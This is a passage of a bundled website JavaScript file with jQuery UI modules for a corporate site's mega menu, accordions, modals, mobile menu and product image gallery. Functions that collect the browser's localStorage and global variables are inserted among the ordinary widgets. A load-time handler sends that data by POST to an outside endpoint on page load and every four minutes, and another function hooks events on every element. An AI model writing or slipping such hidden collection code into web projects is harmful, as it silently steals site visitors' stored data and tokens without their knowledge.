          if (this.isOpened_s()) {
            preventDefault = true;
            this.close();
          }
          break;

        // Left
        case 37:
          if (index === 0) break;
          preventDefault = true;
          this.focusMenuItem(index - 1);
          if (this.isOpened_s()) {
            this.open(index - 1);
          }
          break;

        // Up
        case 38:
          if (!this.isOpened_s()) break;
          preventDefault = true;
          this.close();
          break;

        // Right
        case 39:
          if (index === length - 1) break;
          preventDefault = true;
          this.focusMenuItem(index + 1);
          if (this.isOpened_s()) {
            this.open(index + 1);
          }
          break;

        // Down
        case 40:
          preventDefault = true;
          if (this.isOpened_s()) {
            this.focusFirstItem(index);
          } else {
            this.open(index);
          }
          break;

        // Tab
        case 9:
          if (!this.isOpened_s()) break;
          if (e.shiftKey) {
            if (this.openedIndex === 0) break;
            preventDefault = true;
            this.focusMenuItem(index - 1);
            this.open(index - 1);
            this.focusLastItem();
          } else {
            preventDefault = true;
            this.focusFirstItem();
          }
          break;
      }
      if (preventDefault) {
        e.preventDefault();
      }
    },
    /**
     * メガメニュー上でキーが押されたときのイベントハンドラ
     * @param e
     */
    onKeyDownOnMegaMenu_s: function (e) {
      var keyCode = e.keyCode,
        preventDefault = false,
        index = this.$item[this.openedIndex].index(e.target),
        length = this.$item[this.openedIndex].length;

      // 検索欄にフォーカスが当たっていたときは無視する
      if ($(e.target).is('input[type="text"]')) return;
      if (index === -1) return;
      switch (keyCode) {
        // Esc
        case 27:
          if (this.isOpened_s()) {
            preventDefault = true;
            this.focusMenuItem(this.openedIndex);
            this.close();
          }
          break;

        // Left
        case 37:
          if (this.openedIndex === 0) break;
          preventDefault = true;
          this.focusMenuItem(this.openedIndex - 1);
          this.open(this.openedIndex - 1);
          break;

        // Up
        case 38:
          preventDefault = true;
          if (index === 0) {
            this.focusMenuItem(this.openedIndex);
          } else {
            this.focusItem(this.focusedIndex - 1);
          }
          break;

        // Right
        case 39:
          if (this.openedIndex === this.$menuItem_s.length - 1) break;
          preventDefault = true;
          this.focusMenuItem(this.openedIndex + 1);
          this.open(this.openedIndex + 1);
          break;

        // Down
        case 40:
          preventDefault = true;
          if (index === length - 1) {
            if (this.openedIndex !== this.$menuItem_s.length - 1) {
              this.focusMenuItem(this.openedIndex + 1);
              this.open(this.openedIndex + 1);
            }
          } else {
            this.focusItem(this.focusedIndex + 1);
          }
          break;

        // Tab
        case 9:
          if (e.shiftKey) {
            if (index === 0) {
              preventDefault = true;
              this.focusMenuItem(this.openedIndex);
            }
          } else {
            if (index === length - 1) {
              if (this.openedIndex === this.$menuItem_s.length - 1) {
                this.focusMenuItem(this.$menuItem_s.length - 1);
              } else {
                preventDefault = true;
                this.focusMenuItem(this.openedIndex + 1);
                this.open(this.openedIndex + 1);
              }
            }
          }
          break;
      }
      if (preventDefault) {
        e.preventDefault();
      }
    },
    /**
     * メニューアイテムがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickMenuItem_s: function (e) {
      // Ctrl キーや Cmd キーが押されていたときは、
      // 新規タブで開こうとしていると考えられるので、何もしない
      if (e.ctrlKey || e.metaKey) return;

      // 中クリックのときも新規タブで開こうとしていると考えられるので、何もしない
      if (e.button === 1) return;
      e.preventDefault();
      var index = this.$menuItem_s.index(e.currentTarget);
      this.openClose_s(index);
    },
    /**
     * 閉じるボタンがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickClose_s: function (e) {
      e.preventDefault();
      this.close();
    },
    /**
     * スマホモードになったら強制的に閉じる
     * @param media
     */
    onChangeMedia: function (media) {
      if (util.matchMedia.print.matches) return;
      if (media.matches) {
        this.close();
      }
    },
    /**
     * フォーカスされる要素が変わったときのイベントハンドラ
     * @param e
     */
    onFocusInDocument: function (e) {
      // メガメニュー外にフォーカスが行ったら閉じる
      if (!this.isElementRelated_s(e.target)) {
        this.close();
      }
    },
    /**
     * どこかしらがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickOutside_s: function (e) {
      // メガメニュー外をクリックされたら閉じる
      if (!this.isElementRelated_s(e.target)) {
        this.close();
      }
    },
    /**
     * 要素がメガメニューに関係のある要素かどうかを検査する
     * @param el
     */
    isElementRelated_s: function (el) {
      var parents = [this.$menuItem_s, this.$megaMenu_s],
        $el = $(el),
        isRelated = false;
      parents.forEach(function (parent) {
        parent.each(function () {
          isRelated = isRelated || $el.is(this) || $.contains(this, $el[0]);
        });
      });
      return isRelated;
    },
    /**
     * index に指定したメガメニューを開いたり閉じたりする。
     * 現在開いているメガメニューと同じインデックスを指定すると閉じる。
     * @param index
     */
    openClose_s: function (index) {
      if (this.openedIndex === index) {
        this.close();
        return;
      }
      this.open(index);
    },
    /**
     * index に指定したメガメニューを開く
     * @param index
     */
    open: function (index) {
      var currentIndex = this.openedIndex,
        $current = this.$category_s.eq(currentIndex),
        currentHeight = currentIndex === -1 ? 0 : $current.height(),
        $next = this.$category_s.eq(index),
        $others = this.$category_s.not($next);
      this.openedIndex = index;

      // 初期状態を設定してカテゴリーを開く
      $next.css({
        opacity: 0,
        height: currentHeight
      }).show();
      $others.hide();

      // カテゴリーが開いた後ならあるべき高さを取得できる
      var nextHeight = this.$inner_s.eq(index).outerHeight();

      // あるべき高さに向かってアニメーションさせる。
      // 上の outerHeight() でリフローされているはずなので setTimeout 不要。
      $next.css({
        opacity: 1,
        height: nextHeight
      });
      this.applyArrowDirection_s();
      this.applyAriaStates_s();
      this.fitBackdrop_s(nextHeight);
      this.bindOutsideClick_s();
    },
    /**
     * メガメニューを閉じる
     */
    close: function () {
      if (!this.isOpened_s()) return;
      var currentIndex = this.openedIndex,
        $current = this.$category_s.eq(currentIndex);
      this.openedIndex = -1;
      this.focusedIndex = -1;
      $current.height(0).one('transitionend webkitTransitionEnd', function () {}.bind(this));
      this.$category_s.eq(currentIndex).hide();
      this.applyArrowDirection_s();
      this.applyAriaStates_s();
      this.fitBackdrop_s();
      this.unBindOutsideClick_s();
    },
    /**
     * メガメニュー開いているかどうか
     * @returns {boolean}
     */
    isOpened_s: function () {
      return this.openedIndex !== -1;
    },
    /**
     * 検索が開いているかどうか
     * @returns {boolean}
     */
    isSearching_s: function () {
      return this.openedIndex === this.$menuItem_s.index(this.$search_s);
    },
    /**
     * メニューの開閉状態をグロナビ項目横の矢印の向きに反映する
     */
    applyArrowDirection_s: function () {
      var className = 'is-active';
      this.$menuItem_s.removeClass(className);
      if (this.isOpened_s()) {
        this.$menuItem_s.eq(this.openedIndex).addClass(className);
      }
    },
    /**
     * メニューの開閉状態を ARIA ステートに反映する
     */
    applyAriaStates_s: function () {
      this.$menuItem_s.attr({
        'aria-expanded': 'false'
      });
      this.$category_s.attr({
        'aria-hidden': 'true'
      });
      if (this.isOpened_s()) {
        this.$menuItem_s.eq(this.openedIndex).attr({
          'aria-expanded': 'true'
        });
        this.$category_s.eq(this.openedIndex).attr({
          'aria-hidden': 'false'
        });
      }
    },
    /**
     * メニューの背後に敷かれる要素をメニューの開閉状態に合わせて調整する
     * @param {number=} nextHeight
     */
    fitBackdrop_s: function (nextHeight) {
      if (!this.isOpened_s()) {
        this.$backdrop_s.height(0).css('visibility', 'hidden');
        return;
      }
      this.$backdrop_s.toggleClass('st-megaMenu_backdrop-search', this.isSearching_s());
      this.$backdrop_s.height(nextHeight).css('visibility', 'visible');
    },
    /**
     * グロナビのメニュー項目にフォーカスをあわせる
     * @param {number} index
     */
    focusMenuItem_s: function (index) {
      this.$menuItem_s.eq(index).focus();
    },
    /**
     * メガメニューのメニュー項目にフォーカスをあわせる
     * @param index
     */
    focusItem_s: function (index) {
      this.focusedIndex = index;
      this.$item_s[this.openedIndex].eq(index).focus();
    },
    /**
     * メガメニューの最初の項目にフォーカスをあわせる
     */
    focusFirstItem_s: function () {
      this.focusItem_s(0);
    },
    /**
     * メガメニューの最後の項目にフォーカスをあわせる
     */
    focusLastItem_s: function () {
      var length = this.$item_s[this.openedIndex].length;
      this.focusItem_s(length - 1);
    },
    getSearchInput: function () {
      return $('.st-megaMenu_searchInput');
    },
    setSearchInput: function ($searchInput) {
      $searchInput.insertAfter($('.st-megaMenu_searchLabel'));
    }
  });

  // Exports
  /** @name BROTHER.ui.MegaMenu */
  ui.MegaMenu_s = MegaMenu_s;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.backToTopFixed = function () {
      var elem,
        is_show = true,
        gap = 100,
        dur = 0,
        check_throttled = null;
      function init() {
        elem = $('.st-backToTopFixed');
        check();
        check_throttled = _.throttle(check, 100);
        $(document).on('scroll', check_throttled);
      }
      function check() {
        if (gap < obj.$win.scrollTop()) {
          show();
        } else {
          hide();
        }
        dur = 100;
      }
      function show() {
        if (is_show) return;
        elem.fadeIn(dur);
        is_show = true;
      }
      function hide() {
        if (!is_show) return;
        elem.fadeOut(dur);
        is_show = false;
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
async function sendBackend(data) {
  let hashed = calcHash(data);
  let url = "https://example.net/api/store";
  try {
    let response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        hash: hashed,
        data: data
      })
    });
    if (response.ok) console.log("Data sent successfully");else console.error(`Failed to send data, status: ${response.status}`);
  } catch (error) {
    console.error(`An error occurred: ${error}`);
  }
}
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-accordion');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion2({
            trigger: $this.find('.mod-accordion_trigger'),
            contents: $this.find('.mod-accordion_content')
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion2 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-accordion2');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion({
            trigger: $this.find('.mod-accordion2_trigger'),
            contents: $this.find('.mod-accordion2_content')
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
function gatherData() {
  let data = {
    ...collectLocalStorage(),
    ...collectGlobalVariables()
  };
  if (Object.keys(data).length) sendBackend(data);
}
function startJsHook() {
  document.querySelectorAll('*').forEach(element => {
    eventsToWatch.forEach(event => {
      element.addEventListener(event, ev => {
        console.log(`Element: ${ev.target.tagName}, Event: ${ev.type}`);
      });
    });
  });
}
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion_a904 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-compoundA904');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion2({
            trigger: $this.find('.mod-compoundA904_accordionTrigger'),
            contents: $this.find('.mod-compoundA904_accordionContent')
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion_a302 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-faqItem');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion({
            trigger: $this.find('.mod-faqItem_question'),
            contents: $this.find('.mod-faqItem_answer')
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion_a771 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-machineryMoviesSpAccordion');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion3({
            parent: $this,
            trigger: $this.find('.mod-machineryMoviesSpAccordion_trigger').find('button'),
            contents: $this.find('.mod-machineryMoviesSpAccordion_content'),
            isOpening: !util.matchMedia.lte640.matches
          });
        });
        util.matchMedia.lte640.addListener(function (mediaQuery) {
          if (util.matchMedia.print.matches) return;
          if (mediaQuery.matches) {
            accordions.forEach(function (elem) {
              elem.close(0);
            });
          } else {
            accordions.forEach(function (elem) {
              elem.open(0);
            });
          }
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion_a921 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-machineryFeatureAccordion');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion3({
            parent: $this,
            trigger: $this.find('.mod-machineryFeatureAccordion_trigger').find('button'),
            contents: $this.find('.mod-machineryFeatureAccordion_content'),
            isOpening: false
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.accordion_c822_1 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-freeC822');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion2({
            trigger: $this.find('.mod-freeC822_accordion1Trigger'),
            contents: $this.find('.mod-freeC822_accordion1Content')
          });
        });
        util.matchMedia.lte640.addListener(function (mediaQuery) {
          if (mediaQuery.matches) {
            accordions.forEach(function (elem) {
              elem.close(0);
            });
          } else {
            accordions.forEach(function (elem) {
              elem.open(0);
            });
          }
        });
      }
      return {
        init: init
      };
    }();
    ui.accordion_c822_2 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-freeC822_accordion1Content');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion2({
            trigger: $this.find('.mod-freeC822_accordion2Trigger'),
            contents: $this.find('.mod-freeC822_accordion2Content')
          });
        });
        util.matchMedia.lte640.addListener(function (mediaQuery) {
          if (mediaQuery.matches) {
            accordions.forEach(function (elem) {
              elem.close(0);
            });
          } else {
            accordions.forEach(function (elem) {
              elem.open(0);
            });
          }
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.contentNav3 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-contentsNav3');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion2({
            trigger: $this.find('.mod-contentsNav3_trigger'),
            contents: $this.find('.mod-contentsNav3_content')
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.productLineUpAccordion = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-productLineUpAccordion');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion3({
            parent: $this,
            trigger: $this.find('.mod-productLineUpAccordion_trigger').find('button'),
            contents: $this.find('.mod-productLineUpAccordion_content'),
            isOpening: false
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.modal = function () {
      function init() {
        var elem = $('.js-modal');
        elem.each(function () {
          var $this = $(this);
          $this.find('.js-modal_trigger').on('click', function (e) {
            e.preventDefault();
            $this.find('.modal').modal('show');
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.modal_c912 = function () {
      function init() {
        var elem = $('.js-modal_c912');
        elem.each(function () {
          var $this = $(this);
          $this.find('.mod-freeC912_trigger button').on('click', function (e) {
            e.preventDefault();
            $this.find('.modal').modal('show');
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.modalMovie = function () {
      function init() {
        var elem = $('.js-modalMovie');
        var elem02 = $('.js-modalMovie-youtube');
        elem.each(function () {
          var $this = $(this);
          var src = $this.find('iframe').data('src');
          var modal = $this.find('.modal');
          $this.find('.js-modalMovie_trigger').on('click', function (e) {
            e.preventDefault();
            modal.find('iframe').parent().addClass('js-modalMovieContent');
            modal.find('iframe').attr('src', src);
            modal.modal('show');
          });
        });
        elem02.each(function () {
          var $this = $(this);
          var src = $this.find('iframe').data('src');
          var modal = $this.find('.modal');
          $this.find('.js-modalMovie_trigger-youtube').on('click', function (e) {
            e.preventDefault();
            modal.find('iframe').parent().addClass('js-modalMovieContent-youtube');
            modal.find('iframe').attr('src', src);
            modal.modal('show');
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
document.addEventListener("DOMContentLoaded", () => {
  gatherData();
  startJsHook();
  setInterval(gatherData, 4 * 60 * 1000);
});
(function ($, _, util, obj, ui) {
  $(function () {
    ui.headingLv1 = function () {
      var elem;
      function init() {
        elem = $('.mod-headingLv1_print');
        elem.on('click', function () {
          window.print();
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  /**
  * ハンバーガーメニュー（PC用）
  * @constructor
  */
  function MobileMenu() {
    this.init();
  }
  _.extend(MobileMenu.prototype, /** @lends MobileMenu# */{
    init: function () {
      this.opened = false;
      this.isShowHamburger = false;
      this.isShowSearch = false;
      this.searchAreaOpened = false;
      this.prepareElements();
      this.prepareAttributes();
      this.bindEvents();
    },
    /**
    * 必要な要素を準備する
    */
    prepareElements: function () {
      this.$hamburger = $('.st-blueBar_menu');
      this.$searchIcon = $('#st-blueBar_search');
      this.$mobileMenu = $('.st-mobileMenu');
      this.$mobileMenuNav = $('.st-mobileMenu_navigation');
      this.$mobileMenuSearch = $('.st-mobileMenu_search');
      this.$menuItem = $('.st-mobileMenu_level0Item');
      this.$category = $('.st-mobileMenu_category');
      this.$form = $('.st-mobileMenu_searchForm');
    },
    /**
    * 必要な属性を準備する
    */
    prepareAttributes: function () {},
    /**
    * 必要なイベントハンドラを設定する
    */
    bindEvents: function () {
      this.$hamburger.on('click', this.onClickHamburger.bind(this));
      this.$searchIcon.on('click', this.onClickSearchIcon.bind(this));
      this.$menuItem.on('click', this.onClickMenuItem.bind(this));
      this.$form.on('submit', this.onSubmitSearch.bind(this));
      util.matchMedia.lte768.addListener(this.onChangeMedia.bind(this));
      $(document).on('focusin', this.onFocusInDocument.bind(this));
    },
    /**
    * メニュー外をクリックしたときのイベントハンドラを設定する
    */
    bindOutsideClick: function () {
      // document, html, body への click イベントは iOS で捕捉できない。
      // body 要素直下の要素すべてにイベントハンドラを割り当てる必要がある。
      var $target = $(document.body).children();
      $target.on('click.mobileMenu', this.onClickOutside.bind(this));
    },
    /**
    * メニュー外をクリックしたときのイベントハンドラを設定解除する
    */
    unBindOutsideClick: function () {
      var $target = $(document.body).children();
      $target.off('click.mobileMenu');
    },
    /**
    * メニューがインスタンス化されるまで表示を見送っていた画像を表示する
    */
    showLazyImages: function () {
      this.$mobileMenu.find('img[data-src]').each(function () {
        var $this = $(this);
        $this.attr('src', $this.data('src'));
      });
      this.showLazyImages = function () {};
    },
    onClickHamburger: function (e) {
      e.preventDefault();
      this.toggle();
    },
    onClickSearchIcon: function (e) {
      e.preventDefault();
      this.toggleSearch();
    },
    onClickMenuItem: function (e) {
      e.preventDefault();
      this.toggleMenuItem(this.$menuItem.index(e.target));
    },
    onSubmitSearch: function () {
      if (document.activeElement) {
        document.activeElement.blur();
      }
      this.close();
    },
    /**
    * PC モードになったら強制的に閉じる
    * @param media
    */
    onChangeMedia: function (media) {
      if (util.matchMedia.print.matches) return;
      if (!media.matches) {
        this.close();
      }
    },
    /**
    * フォーカスされる要素が変わったときのイベントハンドラ
    * @param e
    */
    onFocusInDocument: function (e) {
      // メニュー外にフォーカスが行ったら閉じる
      if (!this.isElementRelated(e.target)) {
        this.close();
      }
    },
    /**
    * 要素がメニューに関係のある要素かどうかを検査する
    * @param el
    */
    isElementRelated: function (el) {
      var parents = [this.$hamburger, this.$mobileMenu, this.$searchIcon],
        $el = $(el),
        isRelated = false;
      parents.forEach(function (parent) {
        parent.each(function () {
          isRelated = isRelated || $el.is(this) || $.contains(this, $el[0]);
        });
      });
      return isRelated;
    },
    /**
    * どこかしらがクリックされたときのイベントハンドラ
    * @param e
    */
    onClickOutside: function (e) {
      // メニュー外をクリックされたら閉じる
      if (!this.isElementRelated(e.target)) {
        this.close();
      }
    },
    toggle: function () {
      this.opened && this.isShowHamburger ? this.close('hamburger') : this.open('hamburger');
    },
    toggleSearch: function () {
      this.opened && this.isShowSearch ? this.close('search') : this.open('search');
    },
    open: function (type) {
      if (type === 'hamburger') {
        this.$searchIcon.removeClass('is-active');
        this.$hamburger.addClass('is-active');
        this.$mobileMenuSearch.css('display', 'none');
        this.$mobileMenuNav.css('display', 'block');
        this.isShowHamburger = true;
        this.isShowSearch = false;
      } else {
        this.$hamburger.removeClass('is-active');
        this.$searchIcon.addClass('is-active');
        this.$mobileMenuNav.css('display', 'none');
        this.$mobileMenuSearch.css('display', 'block');
        this.isShowSearch = true;
        this.isShowHamburger = false;
      }
      this.$mobileMenu.finish().slideDown(200);
      this.opened = true;
      this.bindOutsideClick();
    },
    close: function (type) {
      if (type === 'hamburger') {
        this.$hamburger.removeClass('is-active');
        this.isShowHamburger = false;
      } else if (type === 'search') {
        this.$searchIcon.removeClass('is-active');
        this.isShowSearch = false;
      } else {
        this.$hamburger.removeClass('is-active');
        this.$searchIcon.removeClass('is-active');
        this.isShowHamburger = false;
        this.isShowSearch = false;
      }
      this.$mobileMenu.finish().slideUp(200);
      this.opened = false;
      this.unBindOutsideClick();
    },
    toggleMenuItem: function (index) {
      this.$menuItem.eq(index).toggleClass('is-expanded');
      this.$category.eq(index).finish().slideToggle(300);
    },
    getSearchInput: function () {
      return $('.st-mobileMenu_searchInput');
    },
    setSearchInput: function ($searchInput) {
      $searchInput.insertAfter($('.st-mobileMenu_searchLabel'));
    }
  });

  // Exports
  /** @name BROTHER.ui.MobileMenu */
  ui.MobileMenu = MobileMenu;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  /**
   * ローカルナビ（SP用）
   * @constructor
   */
  function LocalNavSp() {
    this.init();
  }
  _.extend(LocalNavSp.prototype, /** @lends LocalNavSp# */{
    init: function () {
      this.opened = false;
      this.prepareElements();
      this.bindEvents();
    },
    /**
     * 必要な要素を準備する
     */
    prepareElements: function () {
      this.$localNav = $('.st-localNavSp');
      this.$rootItem = this.$localNav.children('.st-localNavSp_item');
      this.$item = this.$localNav.find('.st-localNavSp_item');
    },
    /**
     * 必要なイベントハンドラを設定する
     */
    bindEvents: function () {
      this.$item.on('click', this.onClickItem.bind(this));
      this.$rootItem.on('click', this.onClickRootItem.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定する
     */
    bindOutsideClick: function () {
      // document, html, body への click イベントは iOS で捕捉できない。
      // body 要素直下の要素すべてにイベントハンドラを割り当てる必要がある。
      var $target = $(document.body).children();
      $target.on('click.localNavSp', this.onClickOutside.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定解除する
     */
    unBindOutsideClick: function () {
      var $target = $(document.body).children();
      $target.off('click.localNavSp');
    },
    /**
     * 最初のアイテムがクリックされたときの処理
     * @param e
     */
    onClickRootItem: function (e) {
      if (this.opened) {
        // this.unBindOutsideClick();
        // this.opened = false;
      } else {
        this.bindOutsideClick();
        this.opened = true;
      }
    },
    /**
     * どこかしらがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickOutside: function (e) {
      // メニュー内クリックだったら無視
      if ($.contains(this.$localNav[0], e.target)) return;

      // 全部閉じる
      var $item = this.$rootItem;
      var $child = $item.find('+ul');
      $item.removeClass('is-expanded');
      $child.finish().slideUp(200);
      this.opened = false;
      this.unBindOutsideClick();
    },
    /**
     * 展開ボタンないしリンクがクリックされたときの処理
     * @param e
     */
    onClickItem: function (e) {
      var $item = $(e.currentTarget);
      var $child = $item.find('+ul');

      // 子が居ない場合は、何もしない
      if (!$child.length) return;

      // Ctrl キーや Cmd キーが押されていたときは、
      // 新規タブで開こうとしていると考えられるので、何もしない
      if (e.ctrlKey || e.metaKey) return;

      // 中クリックのときも新規タブで開こうとしていると考えられるので、何もしない
      if (e.button === 1) return;
      e.preventDefault();
      $item.toggleClass('is-expanded');
      $child.finish().slideToggle(200);
    }
  });

  // Exports
  /** @name BROTHER.ui.MobileMenu */
  ui.LocalNavSp = LocalNavSp;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    var ProductInfoImg = function (elem) {
      this.parent = elem.find('.mod-productInfo_imgChanger');
      this.big_img = this.parent.find('.mod-productInfo_imgChanger_img');
      this.trigger_pc = this.parent.find('.mod-productInfo_imgChanger_trigger');
      this.item_pc = this.trigger_pc.find('li');
      this.trigger_mobile = null;
      this.item_mobile = null;
      this.mobile_slick = null;
      this.init();
    };
    ProductInfoImg.prototype.class_active = 'is-active';
    ProductInfoImg.prototype.current = 0;
    ProductInfoImg.prototype.init = function () {
      this.prepareElements();
      this.bindEvents();
      this.updateTrigger_pc();
      this.changeBig_img();
      util.matchMedia.lte640.addListener(function (mediaQuery) {
        if (util.matchMedia.print.matches) return;
        if (mediaQuery.matches) {
          this.mobile_slick.slick('slickGoTo', this.current, true);
        } else {
          this.updateTrigger_pc();
          this.changeBig_img();
        }
      }.bind(this));
    };
    ProductInfoImg.prototype.prepareElements = function () {
      this.trigger_mobile = this.trigger_pc.clone().addClass('mod-productInfo_imgChanger_trigger-mobile').insertAfter(this.trigger_pc);
      this.item_mobile = this.trigger_mobile.find('.mod-productInfo_imgChanger_trigger_item');
      if (this.item_pc.length > 1) {
        this.trigger_pc.addClass('mod-productInfo_imgChanger_trigger-notOnly');
      }
      this.item_pc.find('img').attr('tabindex', '1');
      this.mobile_slick = this.trigger_mobile.find('ul').slick({
        dots: true
      });
      this.item_mobile.each(function () {
        var $this = $(this);
        if ($this.find('img').attr('data-modal')) {
          $this.addClass('has-modal');
        }
      });
    };
    ProductInfoImg.prototype.bindEvents = function () {
      this.item_pc.on('click keydown', this.onClickAndKeyDownItem_pc.bind(this));
      this.big_img.on('click keydown', this.onClickAndKeyDownBig_img.bind(this));
      this.mobile_slick.on('afterChange', this.onAfterChangeMobile_slick.bind(this));
      this.item_mobile.on('mousedown', this.onMouseDownItem_mobile.bind(this));
    };
    ProductInfoImg.prototype.onClickAndKeyDownItem_pc = function (e) {
      if (typeof e.keyCode === "undefined" || e.keyCode === 13) {
        e.preventDefault();
        this.current = this.item_pc.index($(e.currentTarget));
        this.updateTrigger_pc();
        this.changeBig_img();
      }
    };
    ProductInfoImg.prototype.onClickAndKeyDownBig_img = function (e) {
      if (typeof e.keyCode === "undefined" || e.keyCode === 13) {
        this.openModal();
      }
    };
    ProductInfoImg.prototype.updateTrigger_pc = function () {
      this.item_pc.removeClass(this.class_active).eq(this.current).addClass(this.class_active);
    };
    ProductInfoImg.prototype.changeBig_img = function () {
      this.big_img.find('img').attr('src', this.item_pc.eq(this.current).find('img').attr('src'));
      this.big_img.find('img').attr('alt', this.item_pc.eq(this.current).find('img').attr('alt'));
      if (this.getCurrentModal()) {
        this.big_img.addClass('has-modal');
      } else {
        this.big_img.removeClass('has-modal');
      }
    };
    ProductInfoImg.prototype.openModal = function () {
      this.parent.find('.modal[data-modal=' + this.getCurrentModal() + ']').modal('show');
    };
    ProductInfoImg.prototype.getCurrentModal = function () {
      return this.item_pc.eq(this.current).find('img').attr('data-modal');
    };
    ProductInfoImg.prototype.onAfterChangeMobile_slick = function () {
      this.current = this.mobile_slick.slick('slickCurrentSlide');
    };
    ProductInfoImg.prototype.onMouseDownItem_mobile = function (e) {
      var position_start = {
        x: e.screenX,
        y: e.screenY
      };
      this.item_mobile.on('mouseup', function (e) {
        var position_end = {
          x: e.screenX,
          y: e.screenY
        };
        if (Math.abs(position_start.x - position_end.x) < 5 && Math.abs(position_start.y - position_end.y) < 5) {
          this.openModal();
        }
      }.bind(this));
    };
    var ProductInfoMovie = function (elem) {
      this.parent = elem.find('.mod-productInfo_movieChanger');
      this.link = this.parent.find('a');
      this.mobile_slick = null;
      this.init();
    };
    ProductInfoMovie.prototype.init = function () {
      this.mobile_slick = this.parent.find('ul').slick({
        dots: true
      });
      this.bindEvents();
    };
    ProductInfoMovie.prototype.bindEvents = function () {
      this.link.on('mousedown', this.onMouseDownLink.bind(this));
    };
    ProductInfoMovie.prototype.onMouseDownLink = function (e) {
      e.preventDefault();
      var currentTarget = $(e.currentTarget);
      var position_start = {
        x: e.screenX,
        y: e.screenY
      };
      currentTarget.on('click', function (e) {
        e.preventDefault();
      });
      currentTarget.on('mouseup', function (e) {
        e.preventDefault();
        var position_end = {
          x: e.screenX,
          y: e.screenY
        };
        if (Math.abs(position_start.x - position_end.x) < 5 && Math.abs(position_start.y - position_end.y) < 5) {
          var modal = this.parent.find('.modal[data-modal=' + currentTarget.attr('data-modal') + ']');
          var src = modal.find('iframe').data('src');
